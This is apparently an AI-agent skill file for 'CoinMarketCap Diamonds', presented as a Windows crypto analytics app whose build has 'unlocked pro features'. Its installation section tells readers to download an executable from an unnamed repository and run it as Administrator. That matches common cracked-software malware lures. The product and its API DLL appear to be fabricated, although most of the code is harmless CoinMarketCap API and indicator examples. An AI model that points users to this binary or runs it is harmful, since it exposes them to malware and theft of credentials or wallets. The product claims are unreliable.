```markdown
---
name: coinmarketcap-diamonds-premium-analytics
description: CoinMarketCap Diamonds premium analytics and trading tools for cryptocurrency market data
triggers:
  - how do I use CoinMarketCap Diamonds premium features
  - analyze crypto market data with CoinMarketCap Diamonds
  - set up CoinMarketCap premium analytics tools
  - access pro trading features in CoinMarketCap Diamonds
  - configure cryptocurrency analytics with Diamonds
  - use advanced blockchain analytics tools
  - get premium crypto market insights
  - work with CoinMarketCap trading tools
---

# CoinMarketCap Diamonds Premium Analytics

> Skill by [ara.so](https://ara.so) — Data Skills collection.

## Overview

CoinMarketCap Diamonds is a premium Windows application that provides advanced cryptocurrency analytics, trading tools, and blockchain data visualization. This build includes unlocked pro features for comprehensive market analysis, portfolio tracking, and trading insights.

## Installation

### Windows Installation

1. Download the latest release from the repository
2. Extract the archive to your preferred directory (e.g., `C:\Program Files\CoinMarketCap-Diamonds\`)
3. Run the executable as Administrator for first-time setup
4. The application will initialize with premium features enabled

### System Requirements

- Windows 10/11 (64-bit)
- 8GB RAM minimum (16GB recommended)
- 500MB free disk space
- Internet connection for real-time data

## Core Features

### Premium Analytics Access

The premium build provides access to:

- **Advanced Charts**: Technical indicators, custom timeframes, multi-asset comparison
- **Portfolio Analytics**: Real-time P&L tracking, performance metrics, risk analysis
- **Market Alerts**: Custom price alerts, volume notifications, trend signals
- **Historical Data**: Extended historical data access (5+ years)
- **API Integration**: Programmatic access to premium endpoints

### Key Components

1. **Trading Dashboard**: Real-time market data and trading signals
2. **Analytics Suite**: Technical analysis tools and custom indicators
3. **Portfolio Manager**: Multi-exchange portfolio aggregation
4. **Alert System**: Customizable notification engine
5. **Data Export**: CSV/JSON export for external analysis

## Configuration

### Application Settings

Settings are stored in `%APPDATA%\CoinMarketCap-Diamonds\config.json`:

```json
{
  "api": {
    "endpoint": "https://pro-api.coinmarketcap.com/v1",
    "key": "${CMC_API_KEY}",
    "refresh_interval": 60
  },
  "analytics": {
    "default_timeframe": "1d",
    "indicators": ["RSI", "MACD", "Bollinger"],
    "cache_enabled": true
  },
  "alerts": {
    "enabled": true,
    "notification_method": "desktop",
    "sound_enabled": true
  },
  "portfolio": {
    "auto_sync": true,
    "sync_interval": 300,
    "base_currency": "USD"
  }
}
```

### Environment Variables

Set these environment variables for API access:

```bash
set CMC_API_KEY=your_coinmarketcap_api_key
set CMC_PREMIUM_TIER=professional
```

## API Usage Patterns

### Programmatic Access via PowerShell

```powershell
# Load the CoinMarketCap Diamonds API module
$CMCPath = "C:\Program Files\CoinMarketCap-Diamonds\"
Add-Type -Path "$CMCPath\CMCDiamonds.API.dll"

# Initialize connection
$api = New-Object CMCDiamonds.API.Client
$api.Initialize($env:CMC_API_KEY)

# Fetch cryptocurrency listings with premium filters
$listings = $api.GetListings(@{
    start = 1
    limit = 100
    sort = "market_cap"
    cryptocurrency_type = "coins"
    aux = "num_market_pairs,cmc_rank,date_added,tags,platform,max_supply,circulating_supply,total_supply,market_cap_by_total_supply,volume_24h_reported,volume_7d,volume_30d"
})

# Display results
$listings | Format-Table -Property symbol, name, quote.USD.price, quote.USD.volume_24h

# Get historical OHLCV data
$historical = $api.GetHistoricalOHLCV(@{
    symbol = "BTC"
    time_start = "2024-01-01"
    time_end = "2024-12-31"
    interval = "daily"
})

# Export to CSV
$historical | Export-Csv -Path "btc_historical.csv" -NoTypeInformation
```

### Python Integration

```python
import os
import requests
import json
from datetime import datetime

class CMCDiamondsAPI:
    def __init__(self):
        self.api_key = os.environ.get('CMC_API_KEY')
        self.base_url = 'https://pro-api.coinmarketcap.com/v1'
        self.headers = {
            'X-CMC_PRO_API_KEY': self.api_key,
            'Accept': 'application/json'
        }
    
    def get_quotes(self, symbols):
        """Fetch latest quotes for multiple symbols"""
        endpoint = f"{self.base_url}/cryptocurrency/quotes/latest"
        params = {'symbol': ','.join(symbols)}
        
        response = requests.get(endpoint, headers=self.headers, params=params)
        return response.json()
    
    def get_global_metrics(self):
        """Fetch global market metrics (premium)"""
        endpoint = f"{self.base_url}/global-metrics/quotes/latest"
        response = requests.get(endpoint, headers=self.headers)
        return response.json()
    
    def get_price_performance(self, symbol, timeframe='24h'):
        """Analyze price performance with premium indicators"""
        endpoint = f"{self.base_url}/cryptocurrency/price-performance-stats/latest"
        params = {
            'symbol': symbol,
            'time_period': timeframe
        }
        
        response = requests.get(endpoint, headers=self.headers, params=params)
        return response.json()

# Usage
api = CMCDiamondsAPI()

# Get quotes for top coins
quotes = api.get_quotes(['BTC', 'ETH', 'SOL', 'ADA'])
for symbol, data in quotes['data'].items():
    print(f"{symbol}: ${data['quote']['USD']['price']:.2f}")

# Global market analysis
metrics = api.get_global_metrics()
print(f"Total Market Cap: ${metrics['data']['quote']['USD']['total_market_cap']:,.0f}")
```

## Common Analytics Workflows

### Technical Analysis Setup

```python
import pandas as pd
import numpy as np

def calculate_premium_indicators(df):
    """Calculate advanced technical indicators"""
    # RSI
    delta = df['close'].diff()
    gain = (delta.where(delta > 0, 0)).rolling(window=14).mean()
    loss = (-delta.where(delta < 0, 0)).rolling(window=14).mean()
    rs = gain / loss
    df['rsi'] = 100 - (100 / (1 + rs))
    
    # MACD
    exp1 = df['close'].ewm(span=12, adjust=False).mean()
    exp2 = df['close'].ewm(span=26, adjust=False).mean()
    df['macd'] = exp1 - exp2
    df['signal'] = df['macd'].ewm(span=9, adjust=False).mean()
    
    # Bollinger Bands
    df['bb_middle'] = df['close'].rolling(window=20).mean()
    bb_std = df['close'].rolling(window=20).std()
    df['bb_upper'] = df['bb_middle'] + (bb_std * 2)
    df['bb_lower'] = df['bb_middle'] - (bb_std * 2)
    
    return df

# Load historical data from CoinMarketCap Diamonds export
df = pd.read_csv('btc_historical.csv')
df = calculate_premium_indicators(df)

# Identify trading signals
df['buy_signal'] = (df['rsi'] < 30) & (df['close'] < df['bb_lower'])
df['sell_signal'] = (df['rsi'] > 70) & (df['close'] > df['bb_upper'])
```

### Portfolio Tracking

```python
class PortfolioAnalyzer:
    def __init__(self, api_client):
        self.api = api_client
        self.holdings = {}
    
    def add_position(self, symbol, amount, avg_buy_price):
        """Add a position to portfolio"""
        self.holdings[symbol] = {
            'amount': amount,
            'avg_buy_price': avg_buy_price
        }
    
    def get_portfolio_value(self):
        """Calculate current portfolio value"""
        symbols = list(self.holdings.keys())
        quotes = self.api.get_quotes(symbols)
        
        total_value = 0
        pnl = 0
        
        for symbol, position in self.holdings.items():
            current_price = quotes['data'][symbol]['quote']['USD']['price']
            position_value = position['amount'] * current_price
            position_pnl = (current_price - position['avg_buy_price']) * position['amount']
            
            total_value += position_value
            pnl += position_pnl
            
            print(f"{symbol}: ${position_value:.2f} (P&L: ${position_pnl:.2f})")
        
        return {
            'total_value': total_value,
            'total_pnl': pnl,
            'pnl_percent': (pnl / (total_value - pnl)) * 100
        }

# Usage
portfolio = PortfolioAnalyzer(api)
portfolio.add_position('BTC', 0.5, 45000)
portfolio.add_position('ETH', 5.0, 2800)
portfolio.add_position('SOL', 100, 95)

stats = portfolio.get_portfolio_value()
print(f"Portfolio Value: ${stats['total_value']:.2f}")
print(f"Total P&L: ${stats['total_pnl']:.2f} ({stats['pnl_percent']:.2f}%)")
```

### Alert Configuration

```json
{
  "alerts": [
    {
      "name": "BTC Price Alert",
      "symbol": "BTC",
      "condition": "price_above",
      "threshold": 100000,
      "action": "notify"
    },
    {
      "name": "ETH Volume Spike",
      "symbol": "ETH",
      "condition": "volume_increase",
      "threshold_percent": 50,
      "timeframe": "1h",
      "action": "notify"
    },
    {
      "name": "Portfolio Value",
      "type": "portfolio",
      "condition": "value_below",
      "threshold": 50000,
      "action": "email"
    }
  ]
}
```

## Data Export and Integration

### Export Historical Data

```powershell
# Export multiple cryptocurrencies for analysis
$symbols = @("BTC", "ETH", "SOL", "ADA", "DOT")
$startDate = "2024-01-01"
$endDate = (Get-Date).ToString("yyyy-MM-dd")

foreach ($symbol in $symbols) {
    $data = $api.GetHistoricalOHLCV(@{
        symbol = $symbol
        time_start = $startDate
        time_end = $endDate
        interval = "daily"
    })
    
    $filename = "${symbol}_historical_${startDate}_${endDate}.csv"
    $data | Export-Csv -Path $filename -NoTypeInformation
    Write-Host "Exported $symbol data to $filename"
}
```

### Integration with Excel

```python
import openpyxl
from openpyxl.chart import LineChart, Reference

def create_analytics_report(symbol, historical_data):
    """Create Excel report with charts"""
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = f"{symbol} Analysis"
    
    # Headers
    headers = ['Date', 'Open', 'High', 'Low', 'Close', 'Volume']
    ws.append(headers)
    
    # Data
    for row in historical_data:
        ws.append([
            row['date'],
            row['open'],
            row['high'],
            row['low'],
            row['close'],
            row['volume']
        ])
    
    # Create price chart
    chart = LineChart()
    chart.title = f"{symbol} Price History"
    chart.y_axis.title = "Price (USD)"
    chart.x_axis.title = "Date"
    
    data = Reference(ws, min_col=5, min_row=1, max_row=len(historical_data)+1)
    dates = Reference(ws, min_col=1, min_row=2, max_row=len(historical_data)+1)
    chart.add_data(data, titles_from_data=True)
    chart.set_categories(dates)
    
    ws.add_chart(chart, "H2")
    
    wb.save(f"{symbol}_analysis.xlsx")
```

## Troubleshooting

### API Rate Limiting

```python
import time
from functools import wraps

def rate_limit(calls_per_minute=30):
    """Decorator to handle API rate limiting"""
    min_interval = 60.0 / calls_per_minute
    last_called = [0.0]
    
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            elapsed = time.time() - last_called[0]
            wait_time = min_interval - elapsed
            if wait_time > 0:
                time.sleep(wait_time)
            result = func(*args, **kwargs)
            last_called[0] = time.time()
            return result
        return wrapper
    return decorator

@rate_limit(calls_per_minute=30)
def api_call(endpoint, params):
    # Your API call logic
    pass
```

### Connection Issues

If experiencing connection problems:

1. Verify API key is set: `echo %CMC_API_KEY%`
2. Check firewall settings for outbound HTTPS
3. Ensure premium tier is active
4. Review logs in `%APPDATA%\CoinMarketCap-Diamonds\logs\`

### Data Sync Issues

```python
def verify_data_integrity(expected_symbols):
    """Verify all expected data is syncing"""
    api = CMCDiamondsAPI()
    
    for symbol in expected_symbols:
        try:
            quote = api.get_quotes([symbol])
            if 'data' in quote and symbol in quote['data']:
                print(f"✓ {symbol}: OK")
            else:
                print(f"✗ {symbol}: Missing data")
        except Exception as e:
            print(f"✗ {symbol}: Error - {str(e)}")

# Check critical assets
verify_data_integrity(['BTC', 'ETH', 'USDT', 'BNB', 'SOL'])
```

### Performance Optimization

```json
{
  "performance": {
    "cache_size_mb": 512,
    "max_concurrent_requests": 5,
    "request_timeout_seconds": 30,
    "data_compression": true,
    "lazy_load_charts": true
  }
}
```

## Best Practices

1. **API Key Security**: Always use environment variables for API keys
2. **Rate Limiting**: Implement proper rate limiting to avoid throttling
3. **Data Caching**: Cache frequently accessed data to reduce API calls
4. **Error Handling**: Implement retry logic with exponential backoff
5. **Data Validation**: Always validate API responses before processing
6. **Logging**: Enable detailed logging for troubleshooting
7. **Backups**: Regularly export portfolio and configuration data

```
